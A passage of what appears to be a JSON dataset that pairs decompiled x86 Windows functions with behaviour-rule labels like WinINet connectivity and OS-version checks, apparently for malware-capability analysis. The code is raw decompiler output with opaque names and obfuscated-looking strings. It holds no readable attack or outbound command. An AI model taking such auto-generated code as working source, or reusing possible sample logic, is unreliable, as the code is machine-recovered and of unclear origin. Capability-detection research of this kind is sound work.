*puStackY464;\n    uint uStackY460;\n    uint *puStackY456;\n    uint uStackY452;\n    uint *puStackY448;\n    uint uStackY444;\n    uint *puStackY440;\n    uint uStackY436;\n    uint *puStackY432;\n    char32_t *pcStackY428;\n    uint *puStackY424;\n    uint uStackY420;\n    uint *puStackY416;\n    uint uStackY412;\n    uint *puStackY408;\n    char32_t *pcStackY404;\n    uint *puStackY400;\n    uint uStackY396;\n    uint *puStackY392;\n    char32_t *pcStackY388;\n    uint *puStackY384;\n    uint uStackY380;\n    uint *puStackY376;\n    uint uStackY372;\n    uint *puStackY368;\n    char32_t *pcStackY364;\n    uint *puStackY360;\n    uint uStackY356;\n    uint *puStackY352;\n    uint uStackY348;\n    uint *puStackY344;\n    uint uStackY340;\n    uint *puStackY336;\n    char32_t *pcStackY332;\n    uint *puStackY328;\n    uint *puStackY324;\n    uint *puStackY320;\n    uint noname_1;\n    uchar *arg_ch;\n    uchar *arg_8h_00;\n    char *noname_4;\n    char *noname_1_00;\n    uint noname_2;\n    uchar *arg_10h;\n    char *var_118h;\n    uint noname_5;\n    uchar *arg_10h_00;\n    char *noname_7;\n    uint noname_8;\n    uchar *arg_10h_01;\n    char *noname_10;\n    uint noname_11;\n    uchar *arg_10h_02;\n    char *noname_13;\n    uint noname_14;\n    uchar *arg_10h_03;\n    char *noname_16;\n    uint noname_17;\n    uchar *arg_10h_04;\n    char *noname_19;\n    uint noname_20;\n    uchar *arg_10h_05;\n    char *noname_22;\n    uint noname_23;\n    uchar *arg_10h_06;\n    char *noname_25;\n    uint noname_26;\n    uchar *arg_10h_07;\n    char *noname_28;\n    uint noname_29;\n    uchar *arg_10h_08;\n    char *noname_31;\n    uint noname_32;\n    uchar *arg_10h_09;\n    char *noname_34;\n    uint noname_35;\n    uchar *arg_10h_10;\n    char *noname_37;\n    uint noname_38;\n    uchar *arg_10h_11;\n    char *noname_40;\n    uint noname_41;\n    uchar *arg_10h_12;\n    char *arg_8h_01;\n    uint noname_48;\n    uchar *arg_10h_13;\n    char *noname_50;\n    uint noname_51;\n    uchar *arg_10h_14;\n    char *noname_53;\n    uint noname_54;\n    uchar *arg_10h_15;\n    char *noname_56;\n    uint noname_57;\n    uchar *arg_10h_16;\n    char *noname_59;\n    uint noname_60;\n    uint noname_61;\n    uchar *arg_14h;\n    char *noname_63;\n    uint noname_64;\n    uint noname_65;\n    uchar *arg_14h_00;\n    uint noname_67;\n    uchar *arg_ch_00;\n    uint noname_69;\n    uchar *arg_ch_01;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x432d9f;\n    var_ch = *in_FS_OFFSET;\n    fcn.0042cc70();\n    *in_FS_OFFSET = &fcn.00413813::var_ch;\n    fcn.004257d0();\n    *(arg_8h + 0xc) = 0;\n    *(arg_8h + 0x10) = 0;\n    *(arg_8h + 8) = 0;\n    *(arg_8h + 0x18) = 0;\n    *(arg_8h + 0x14) = 0;\n    *(arg_8h + 0x1c) = 0;\n    fcn.004136a5();\n    arg_ch_01 = &stack0xfffe7634;\n    noname_69 = *0x446110;\n    fcn.00413509(*0x446110, arg_ch_01);\n    arg_ch_00 = &stack0xfffe7634;\n    noname_67 = *0x445ed0;\n    fcn.00413509(*0x445ed0, arg_ch_00);\n    arg_14h_00 = &stack0xfffe7634;\n    noname_63 = arg_8h;\n    noname_64 = *0x445dbc;\n    noname_65 = *0x446040;\n    fcn.004130dd(arg_8h, *0x445dbc, *0x446040, arg_14h_00);\n    arg_14h = &stack0xfffe7634;\n    noname_59 = arg_8h;\n    noname_60 = *0x445de0;\n    noname_61 = *0x445ad4;\n    fcn.004130dd(arg_8h, *0x445de0, *0x445ad4, arg_14h);\n    arg_10h_16 = &stack0xfffe7634;\n    noname_56 = arg_8h;\n    noname_57 = *0x445e60;\n    fcn.00412ee7(arg_8h, *0x445e60, arg_10h_16);\n    arg_10h_15 = &stack0xfffe7634;\n    noname_53 = arg_8h;\n    noname_54 = *0x445c14;\n    fcn.00412ee7(arg_8h, *0x445c14, arg_10h_15);\n    arg_10h_14 = &stack0xfffe7634;\n    noname_50 = arg_8h;\n    noname_51 = *0x445f78;\n    fcn.00412ee7(arg_8h, *0x445f78, arg_10h_14);\n    arg_10h_13 = &stack0xfffe7634;\n    arg_8h_01 = arg_8h;\n    noname_48 = *0x445e64;\n    fcn.00412ee7(arg_8h, *0x445e64, arg_10h_13);\n    arg_10h_12 = &stack0xfffe7634;\n    noname_40 = arg_8h;\n    noname_41 = *0x445e8c;\n    fcn.00412ee7(arg_8h, *0x445e8c, arg_10h_12);\n    arg_10h_11 = &stack0xfffe7634;\n    noname_37 = arg_8h;\n    noname_38 = *0x446154;\n    fcn.00412ee7(arg_8h, *0x446154, arg_10h_11);\n    arg_10h_10 = &stack0xfffe7634;\n    noname_34 = arg_8h;\n    noname_35 = *0x446084;\n    fcn.00412ee7(arg_8h, *0x446084, arg_10h_10);\n    arg_10h_09 = &stack0xfffe7634;\n    noname_31 = arg_8h;\n    noname_32 = *0x445a94;\n    fcn.00412ee7(arg_8h, *0x445a94, arg_10h_09);\n    arg_10h_08 = &stack0xfffe7634;\n    noname_28 = arg_8h;\n    noname_29 = *0x445e28;\n    fcn.00412ee7(arg_8h, *0x445e28, arg_10h_08);\n    arg_10h_07 = &stack0xfffe7634;\n    noname_25 = arg_8h;\n    noname_26 = *0x445bb0;\n    fcn.00412ee7(arg_8h, *0x445bb0, arg_10h_07);\n    arg_10h_06 = &stack0xfffe7634;\n    noname_22 = arg_8h;\n    noname_23 = *0x445e1c;\n    fcn.00412ee7(arg_8h, *0x445e1c, arg_10h_06);\n    arg_10h_05 = &stack0xfffe7634;\n    noname_19 = arg_8h;\n    noname_20 = *0x446188;\n    fcn.00412ee7(arg_8h, *0x446188, arg_10h_05);\n    arg_10h_04 = &stack0xfffe7634;\n    noname_16 = arg_8h;\n    noname_17 = *0x445ae8;\n    fcn.00412ee7(arg_8h, *0x445ae8, arg_10h_04);\n    arg_10h_03 = &stack0xfffe7634;\n    noname_13 = arg_8h;\n    noname_14 = *0x446244;\n    fcn.00412ee7(arg_8h, *0x446244, arg_10h_03);\n    arg_10h_02 = &stack0xfffe7634;\n    noname_10 = arg_8h;\n    noname_11 = *0x445b6c;\n    fcn.00412ee7(arg_8h, *0x445b6c, arg_10h_02);\n    arg_10h_01 = &stack0xfffe7634;\n    noname_7 = arg_8h;\n    noname_8 = *0x446128;\n    fcn.00412ee7(arg_8h, *0x446128, arg_10h_01);\n    arg_10h_00 = &stack0xfffe7634;\n    var_118h = arg_8h;\n    noname_5 = *0x445b00;\n    fcn.00412ee7(arg_8h, *0x445b00, arg_10h_00);\n    arg_10h = &stack0xfffe7634;\n    noname_4 = 0x413a9f;\n    noname_1_00 = arg_8h;\n    noname_2 = *0x445cd0;\n    fcn.00412ee7(arg_8h, *0x445cd0, arg_10h);\n    if (*arg_8h != '\\0') {\n        noname_4 = arg_8h;\n        fcn.00410de5(arg_8h, noname_1_00, noname_2, arg_10h, var_118h, noname_5, arg_10h_00, noname_7, noname_8, \n                     arg_10h_01, noname_10, noname_11, arg_10h_02, noname_13, noname_14, arg_10h_03, noname_16, \n                     noname_17, arg_10h_04, noname_19, noname_20, arg_10h_05, noname_22, noname_23, arg_10h_06, \n                     noname_25, noname_26, arg_10h_07, noname_28, noname_29, arg_10h_08, noname_31, noname_32, \n                     arg_10h_09, noname_34, noname_35, arg_10h_10, noname_37, noname_38, arg_10h_11, noname_40, \n                     noname_41, arg_10h_12, arg_8h_01);\n        if (*arg_8h != '\\0') {\n            arg_8h_00 = &stack0xfffe7634;\n            fcn.004119fc(arg_8h_00);\n            arg_ch = &stack0xfffe7634;\n            noname_1 = *0x445c4c;\n            fcn.00413509(*0x445c4c, arg_ch);\n            puStackY320 = 0x413adf;\n            fcn.004107b2(&stack0xfffe7634, noname_1, arg_ch, arg_8h_00, noname_4, noname_1_00, noname_2, arg_10h, \n                         var_118h, noname_5, arg_10h_00, noname_7, noname_8, arg_10h_01, noname_10, noname_11, \n                         arg_10h_02, noname_13, noname_14, arg_10h_03, noname_16, noname_17, arg_10h_04, noname_19, \n                         noname_20, arg_10h_05, noname_22, noname_23, arg_10h_06, noname_25, noname_26, arg_10h_07, \n                         noname_28, noname_29, arg_10h_08, noname_31, noname_32, arg_10h_09, noname_34, noname_35, \n                         arg_10h_10, noname_37, noname_38, arg_10h_11, noname_40, noname_41, arg_10h_12, arg_8h_01, \n                         noname_48, arg_10h_13, noname_50, noname_51, arg_10h_14, noname_53, noname_54, arg_10h_15, \n                         noname_56, noname_57, arg_10h_16, noname_59, noname_60, noname_61, arg_14h, noname_63, \n                         noname_64, noname_65, arg_14h_00, noname_67, arg_ch_00, noname_69, arg_ch_01);\n        }\n    }\n    if (arg_8h[5] != '\\0') {\n        puStackY324 = &fcn.00413813::var_118h;\n        puStackY320 = NULL;\n        puStackY328 = 0x413aff;\n        fcn.004257d0();\n        puStackY324 = &fcn.00413813::var_328h;\n        puStackY320 = NULL;\n        puStackY328 = 0x413b10;\n        fcn.004257d0();\n        puStackY324 = &fcn.00413813::var_220h;\n        puStackY320 = NULL;\n        puStackY328 = 0x413b21;\n        fcn.004257d0();\n        puStackY320 = 0x413b2b;\n        fcn.00416c79(0x1a);\n        puStackY320 = &fcn.00413813::var_118h;\n        puStackY324 = 0x413b3a;\n        (**0x4464ac)();\n        puStackY324 = 0x43bd7c;\n        puStackY328 = &fcn.00413813::var_118h;\n        pcStackY332 = 0x413b4c;\n        (**0x4464ac)();\n        pcStackY332 = L\"TgmDkd87F35E\u2a70\u616d\";\n        puStackY336 = &fcn.00413813::var_118h;\n        uStackY340 = 0x413b5e;\n        (**0x4464ac)();\n        uStackY340 = 0x43e1a4;\n        puStackY344 = &fcn.00413813::var_118h;\n        uStackY348 = 0x413b71;\n        (**0x4464ac)();\n        uStackY348 = 0x43e1a8;\n        puStackY352 = &fcn.00413813::var_118h;\n        uStackY356 = 0x413b83;\n        (**0x4464ac)();\n        uStackY356 = 0x43e1a4;\n        puStackY360 = &fcn.00413813::var_118h;\n        pcStackY364 = 0x413b91;\n        (**0x4464ac)();\n        pcStackY364 = L\"gmDkd87F35E\u2a70\u616d\";\n        puStackY368 = &fcn.00413813::var_118h;\n        uStackY372 = 0x413ba3;\n        (**0x4464ac)();\n        uStackY372 = 0x43e1b8;\n        puStackY376 = &fcn.00413813::var_118h;\n        uStackY380 = 0x413bb5;\n        (**0x4464ac)();\n        uStackY380 = 0x43e1c8;\n        puStackY384 = &fcn.00413813::var_118h;\n        pcStackY388 = 0x413bc8;\n        (**0x4464ac)();\n        pcStackY388 = L\"mDkd87F35E\u2a70\u616d\";\n        puStackY392 = &fcn.00413813::var_118h;\n        uStackY396 = 0x413bda;\n        (**0x4464ac)();\n        uStackY396 = 0x43e1b0;\n        puStackY400 = &fcn.00413813::var_118h;\n        pcStackY404 = 0x413bec;\n        (**0x4464ac)();\n        pcStackY404 = L\"Dkd87F35E\u2a70\u616d\";\n        puStackY408 = &fcn.00413813::var_118h;\n        uStackY412 = 0x413bff;\n        (**0x4464ac)();\n        uStackY412 = 0x43e1a4;\n        puStackY416 = &fcn.00413813::var_118h;\n        uStackY420 = 0x413c0d;\n        (**0x4464ac)();\n        uStackY420 = 0x43e1d0;\n        puStackY424 = &fcn.00413813::var_118h;\n        pcStackY428 = 0x413c1f;\n        (**0x4464ac)();\n        pcStackY428 = L\"kd87F35E\u2a70\u616d\";\n        puStackY432 = &fcn.00413813::var_118h;\n        uStackY436 = 0x413c31;\n        (**0x4464ac)();\n        uStackY436 = 0x43e1cc;\n        puStackY440 = &fcn.00413813::var_118h;\n        uStackY444 = 0x413c43;\n        (**0x4464ac)();\n        uStackY444 = 0x43e1ac;\n        puStackY448 = &fcn.00413813::var_118h;\n        uStackY452 = 0x413c55;\n        (**0x4464ac)();\n        uStackY452 = 0x43ea60;\n        puStackY456 = &fcn.00413813::var_118h;\n        uStackY460 = 0x413c67;\n        (**0x4464ac)();\n        uStackY460 = 0x43bd7c;\n        puStackY464 = &fcn.00413813::var_118h;\n        pcStackY468 = 0x413c79;\n        (**0x4464ac)();\n        pcStackY468 = L\"kd87F35E\u2a70\u616d\";\n        puStackY472 = &fcn.00413813::var_328h;\n        uStackY476 = 0x413c8b;\n        (**0x4464ac)();\n        uStackY476 = 0x43e1a4;\n        puStackY480 = &fcn.00413813::var_328h;\n        uStackY484 = 0x413c99;\n        (**0x4464ac)();\n        uStackY484 = 0x43e1bc;\n        puStackY488 = &fcn.00413813::var_328h;\n        uStackY492 = 0x413cab;\n        (**0x4464ac)();\n        uStackY492 = 0x43e4fc;\n        puStackY496 = &fcn.00413813::var_328h;\n        pcStackY500 = 0x413cbd;\n        (**0x4464ac)();\n        pcStackY500 = L\"d87F35E\u2a70\u616d\";\n        puStackY504 = &fcn.00413813::var_328h;\n        uStackY508 = 0x413ccf;\n        (**0x4464ac)();\n        uStackY508 = 0x43e1c8;\n        puStackY512 = &fcn.00413813::var_328h;\n        uStackY516 = 0x413cdd;\n        (**0x4464ac)();\n        uStackY516 = 0x43e1cc;\n        puStackY520 = &fcn.00413813::var_328h;\n        uStackY524 = 0x413cef;\n        (**0x4464ac)();\n        uStackY524 = 0x43e1c8;\n        puStackY528 = &fcn.00413813::var_328h;\n        uStackY532 = 0x413cfd;\n        (**0x4464ac)();\n        uStackY532 = 0x43e1d0;\n        puStackY536 = &fcn.00413813::var_328h;\n        pcStackY540 = 0x413d0f;\n        (**0x4464ac)();\n        pcStackY540 = L\"Dkd87F35E\u2a70\u616d\";\n        puStackY544 = &fcn.00413813::var_220h;\n        var_220h = 0x413d1d;\n        (**0x4464ac)();\n        var_220h = L\"87F35E\u2a70\u616d\";\n        puStackY552 = &fcn.00413813::var_220h;\n        pcStackY556 = 0x413d30;\n        (**0x4464ac)();\n        pcStackY556 = L\"7F35E\u2a70\u616d\";\n        puStackY560 = &fcn.00413813::var_220h;\n        pcStackY564 = 0x413d43;\n        (**0x4464ac)();\n        pcStackY564 = L\"7F35E\u2a70\u616d\";\n        puStackY568 = &fcn.00413813::var_220h;\n        pcStackY572 = 0x413d51;\n        (**0x4464ac)();\n        pcStackY572 = L\"F35E\u2a70\u616d\";\n        puStackY576 = &fcn.00413813::var_220h;\n        pcStackY580 = 0x413d63;\n        (**0x4464ac)();\n        pcStackY580 = L\"7F35E\u2a70\u616d\";\n        puStackY584 = &fcn.00413813::var_220h;\n        pcStackY588 = 0x413d71;\n        (**0x4464ac)();\n        pcStackY588 = L\"87F35E\u2a70\u616d\";\n        puStackY592 = &fcn.00413813::var_220h;\n        pcStackY596 = 0x413d7f;\n        (**0x4464ac)();\n        pcStackY596 = L\"35E\u2a70\u616d\";\n        puStackY600 = &fcn.00413813::var_220h;\n        pcStackY604 = 0x413d92;\n        (**0x4464ac)();\n        pcStackY604 = L\"Dkd87F35E\u2a70\u616d\";\n        puStackY608 = &fcn.00413813::var_220h;\n        pcStackY612 = 0x413da0;\n        (**0x4464ac)();\n        pcStackY612 = L\"5E\u2a70\u616d\";\n        puStackY616 = &fcn.00413813::var_220h;\n        pcStackY620 = 0x413db2;\n        (**0x4464ac)();\n        pcStackY620 = L\"Dkd87F35E\u2a70\u616d\";\n        puStackY624 = &fcn.00413813::var_220h;\n        pcStackY628 = 0x413dc0;\n        (**0x4464ac)();\n        pcStackY628 = L\"35E\u2a70\u616d\";\n        puStackY632 = &fcn.00413813::var_220h;\n        pcStackY636 = 0x413dce;\n        (**0x4464ac)();\n        pcStackY636 = L\"E\u2a70\u616d\";\n        puStackY640 = &fcn.00413813::var_220h;\n        pcStackY644 = 0x413de0;\n        (**0x4464ac)();\n        pcStackY644 = L\"F35E\u2a70\u616d\";\n        puStackY648 = &fcn.00413813::var_220h;\n        pcStackY652 = 0x413df2;\n        (**0x4464ac)();\n        pcStackY652 = L\"87F35E\u2a70\u616d\";\n        puStackY656 = &fcn.00413813::var_220h;\n        uStackY660 = 0x413e00;\n        (**0x4464ac)();\n        uStackY660 = 0x43e458;\n        puStackY664 = &fcn.00413813::var_220h;\n        uStackY668 = 0x413e12;\n        (**0x4464ac)();\n        uStackY668 = 0x43e454;\n        puStackY672 = &fcn.00413813::var_220h;\n        uStackY676 = 0x413e24;\n        (**0x4464ac)();\n        fcn.00411242(0x43bd76, &fcn.00413813::var_118h, &fcn.00413813::var_328h);\n        fcn.00411242(0x43bd76, &fcn.00413813::var_118h, &fcn.00413813::var_220h);\n        uStackY100820 = 0xf;\n        uStackY100824 = 0;\n        auStackY100840[0] = 0;\n        fcn.00403fb5();\n        var_4h = 0;\n        puVar1 = fcn.004042b6(&stack0xfffe75fc, L\"\u616d\", &stack0xfffe7618);\n        var_4h = CONCAT31(var_4h._1_3_, 1);\n        if (0xf < puVar1[5]) {\n            puVar1 = *puVar1;\n        }\n        fcn.00411242(0x43bd76, &fcn.00413813::var_118h, puVar1);\n        fcn.00403f73();\n        var_4h = 0xffffffff;\n        fcn.00403f73();\n        uStackY100820 = 0xf;\n        uStackY100824 = 0;\n        auStackY100840[0] = 0;\n        fcn.00403fb5();\n        var_4h = 2;\n        puVar1 = fcn.004042b6(&stack0xfffe75fc, \"A7FDF864F\", &stack0xfffe7618);\n        var_4h = CONCAT31(var_4h._1_3_, 3);\n        if (0xf < puVar1[5]) {\n            puVar1 = *puVar1;\n        }\n        fcn.00411242(0x43bd76, &fcn.00413813::var_118h, puVar1);\n        fcn.00403f73();\n        var_4h = 0xffffffff;\n        fcn.00403f73();\n        uStackY100820 = 0xf;\n        uStackY100824 = 0;\n        auStackY100840[0] = 0;\n        fcn.00403fb5();\n        var_4h = 4;\n        puVar1 = fcn.004042b6(&stack0xfffe75fc, \"A92DAA6E\", &stack0xfffe7618);\n        var_4h = CONCAT31(var_4h._1_3_, 5);\n        if (0xf < puVar1[5]) {\n            puVar1 = *puVar1;\n        }\n        fcn.00411242(0x43bd76, &fcn.00413813::var_118h, puVar1);\n        fcn.00403f73();\n        var_4h = 0xffffffff;\n        fcn.00403f73();\n        var_118h = \"C461824F*\";\n        uStackY100876 = 0xf;\n        uStackY100880 = 0;\n        auStackY100896[0] = 0;\n        fcn.00403fb5();\n        var_4h = 6;\n        puVar1 = fcn.004042b6(&stack0xfffe75c4, \"F8806DD0\", &stack0xfffe75e0);\n        var_4h = CONCAT31(var_4h._1_3_, 7);\n        if (0xf < puVar1[5]) {\n            puVar1 = *puVar1;\n        }\n        fcn.00411242(0x43bd76, &fcn.00413813::var_118h, puVar1);\n        noname_4 = NULL;\n        fcn.00403f73();\n        var_4h = 0xffffffff;\n        fcn.00403f73();\n    }\n    *(arg_8h + 0xc) = *0x4462b4;\n    *(arg_8h + 0x10) = *0x4462c0;\n    puStackY320 = 0x41409c;\n    puStackY324 = (**0x4463a4)();\n    puStackY320 = 0x3;\n    puStackY328 = *0x4460c4;\n    pcStackY332 = 0x4140b3;\n    fcn.0041d4dc();\n    *in_FS_OFFSET = var_ch;\n    fcn.0041e0a1(noname_4);\n    return;\n}\n",
        "token_count": 7654
    },
    "004140d2": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004140d2(int32_t param_1, int32_t param_2)\n\n{\n    uint *in_EAX;\n    uint *puVar1;\n    int32_t *unaff_EBX;\n    int32_t iVar2;\n    \n    puVar1 = in_EAX;\n    if (0xf < in_EAX[5]) {\n        puVar1 = *in_EAX;\n    }\n    if (param_1 == 0) {\n        iVar2 = 0;\n    }\n    else {\n        iVar2 = param_1 - puVar1;\n    }\n    if (param_2 != 0) {\n        param_2 = param_2 - param_1;\n    }\n    fcn.0040415d(iVar2, param_2);\n    if (0xf < in_EAX[5]) {\n        in_EAX = *in_EAX;\n    }\n    *unaff_EBX = in_EAX + iVar2;\n    return;\n}\n",
        "token_count": 212
    },
    "0041416b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0041416b(int32_t param_1, uint32_t param_2, uint param_3)\n\n{\n    param_2 = *(param_1 + 0xc) | param_2;\n    if (*(param_1 + 0x38) == 0) {\n        param_2 = param_2 | 4;\n    }\n    *(param_1 + 0xc) = param_2 & 0x17;\n    if ((*(param_1 + 0x10) & param_2 & 0x17) != 0) {\n        fcn.0040e46a(param_3);\n    }\n    return;\n}\n",
        "token_count": 149
    },
    "0041420c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0041420c(int32_t *param_1)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    \n    if (*param_1[8] == NULL) {\n        iVar2 = 0;\n    }\n    else {\n        iVar2 = *param_1[0xc];\n    }\n    if (0 < iVar2) {\n        return **param_1[8];\n    }\n    // WARNING: Could not recover jumptable at 0x00414229. Too many branches\n    // WARNING: Treating indirect jump as call\n    uVar1 = (**(*param_1 + 0x18))();\n    return uVar1;\n}\n",
        "token_count": 154
    },
    "0041422c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.0041422c(void)\n\n{\n    uint32_t uVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint8_t *puVar3;\n    \n    iVar2 = 0;\n    if (*in_EAX[8] != 0) {\n        iVar2 = *in_EAX[0xc];\n    }\n    if (1 < iVar2) {\n        *in_EAX[0xc] = *in_EAX[0xc] + -1;\n        puVar3 = *in_EAX[8] + 1;\n        *in_EAX[8] = puVar3;\n        return *puVar3;\n    }\n    iVar2 = fcn.00414d35();\n    if (iVar2 == -1) {\n        return 0xffffffff;\n    }\n    if (*in_EAX[8] == NULL) {\n        iVar2 = 0;\n    }\n    else {\n        iVar2 = *in_EAX[0xc];\n    }\n    if (0 < iVar2) {\n        return **in_EAX[8];\n    }\n    // WARNING: Could not recover jumptable at 0x00414229. Too many branches\n    // WARNING: Treating indirect jump as call\n    uVar1 = (**(*in_EAX + 0x18))();\n    return uVar1;\n}\n",
        "token_count": 298
    },
    "null": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __cdecl\nmethod.std::basic_streambuf_char__struct_std::char_traits_char__.virtual_32\n          (uchar *arg_8h, uint32_t arg_ch, int32_t arg_10h)\n\n{\n    uint32_t arg_10h_00;\n    int32_t *in_ECX;\n    int32_t iVar1;\n    bool bVar2;\n    uint32_t uStack16;\n    int32_t iStack12;\n    \n    uStack16 = 0;\n    iStack12 = 0;\n    if ((-1 < arg_10h) && ((0 < arg_10h || (arg_ch != 0)))) {\n        do {\n            arg_10h_00 = 0;\n            if (*in_ECX[8] != 0) {\n                arg_10h_00 = *in_ECX[0xc];\n            }\n            iVar1 = arg_10h_00 >> 0x1f;\n            if ((iVar1 < 0) || ((-1 < arg_10h_00 || iVar1 < 0 && (arg_10h_00 == 0)))) {\n                iVar1 = (**(*in_ECX + 0x1c))();\n                if (iVar1 == -1) break;\n                bVar2 = 0xfffffffe < uStack16;\n                uStack16 = uStack16 + 1;\n                *arg_8h = iVar1;\n                iStack12 = iStack12 + bVar2;\n                bVar2 = arg_ch != 0;\n                arg_ch = arg_ch - 1;\n                arg_10h = arg_10h + -1 + bVar2;\n                arg_8h = arg_8h + 1;\n            }\n            else {\n                if ((arg_10h <= iVar1) && ((arg_10h < iVar1 || (arg_ch < arg_10h_00)))) {\n                    iVar1 = arg_10h;\n                    arg_10h_00 = arg_ch;\n                }\n                fcn.00420150(arg_8h, *in_ECX[8], arg_10h_00);\n                bVar2 = CARRY4(uStack16, arg_10h_00);\n                uStack16 = uStack16 + arg_10h_00;\n                iStack12 = iStack12 + iVar1 + bVar2;\n                bVar2 = arg_ch < arg_10h_00;\n                arg_ch = arg_ch - arg_10h_00;\n                arg_10h = (arg_10h - iVar1) - bVar2;\n                *in_ECX[0xc] = *in_ECX[0xc] - arg_10h_00;\n                *in_ECX[8] = *in_ECX[8] + arg_10h_00;\n                arg_8h = arg_8h + arg_10h_00;\n            }\n            if ((arg_10h < 1) && ((arg_10h < 0 || (arg_ch == 0)))) break;\n        } while( true );\n    }\n    return CONCAT44(iStack12, uStack16);\n}\n",
        "token_count": 681
    },
    "00414583": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00414583(void)\n\n{\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00420895(4);\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable.std::basic_filebuf_char__struct_std::char_traits_char__.0;\n    *(unaff_EBP + -4) = 0;\n    if (extraout_ECX[0x15] != NULL) {\n        fcn.00414f51();\n    }\n    if (*(extraout_ECX + 0x14) != '\\0') {\n        fcn.00414ddb();\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.004141e3();\n    fcn.00420934();\n    return;\n}\n",
        "token_count": 201
    },
    "00414cea": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00414cea(void)\n\n{\n    int32_t *unaff_EDI;\n    \n    fcn.00420895(4);\n    if (*(unaff_EDI + *(*unaff_EDI + 4) + 0xc) == 0) {\n        if (*(unaff_EDI + *(*unaff_EDI + 4) + 0x3c) != 0) {\n            fcn.0041412c();\n        }\n        if (*(unaff_EDI + *(*unaff_EDI + 4) + 0xc) == 0) goto code_r0x00414d2f;\n    }\n    fcn.0041416b(2, 0);\ncode_r0x00414d2f:\n    fcn.00420934();\n    return;\n}\n",
        "token_count": 174
    },
    "00414d62": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00414d62(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint arg_8h_00;\n    int32_t *piVar3;\n    int32_t unaff_EBX;\n    int32_t unaff_EBP;\n    uint var_4h;\n    \n    fcn.00420895(0);\n    if ((*(unaff_EBX + 0x54) == 0) && (iVar2 = fcn.0041dd0c(*(unaff_EBP + 8), *(unaff_EBP + 0xc), 0x40),  iVar2 != 0)) {\n        fcn.00414e24(1);\n        arg_8h_00 = fcn.00415089();\n        *(unaff_EBP + -4) = 0;\n        piVar3 = fcn.00415300(arg_8h_00);\n        cVar1 = (**(*piVar3 + 4))();\n        if (cVar1 == '\\0') {\n            *(unaff_EBX + 0x44) = piVar3;\n            fcn.00415098();\n        }\n        else {\n            *(unaff_EBX + 0x44) = 0;\n        }\n        fcn.0040e240();\n    }\n    fcn.00420934();\n    return;\n}\n",
        "token_count": 323
    },
    "00414e24": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00414e24(int32_t param_1)\n\n{\n    uint uVar1;\n    int32_t unaff_ESI;\n    int32_t unaff_EDI;\n    \n    *(unaff_ESI + 0x49) = 0;\n    *(unaff_ESI + 0x50) = param_1 == 1;\n    fcn.00415098();\n    if (unaff_EDI != 0) {\n        *(unaff_ESI + 0x10) = unaff_EDI + 8;\n        *(unaff_ESI + 0x14) = unaff_EDI + 8;\n        *(unaff_ESI + 0x20) = unaff_EDI;\n        *(unaff_ESI + 0x24) = unaff_EDI;\n        *(unaff_ESI + 0x30) = unaff_EDI + 4;\n        *(unaff_ESI + 0x34) = unaff_EDI + 4;\n    }\n    uVar1 = *0x4467a4;\n    *(unaff_ESI + 0x44) = 0;\n    *(unaff_ESI + 0x54) = unaff_EDI;\n    *(unaff_ESI + 0x4c) = uVar1;\n    return;\n}\n",
        "token_count": 289
    },
    "00414e68": {
        "rules": [
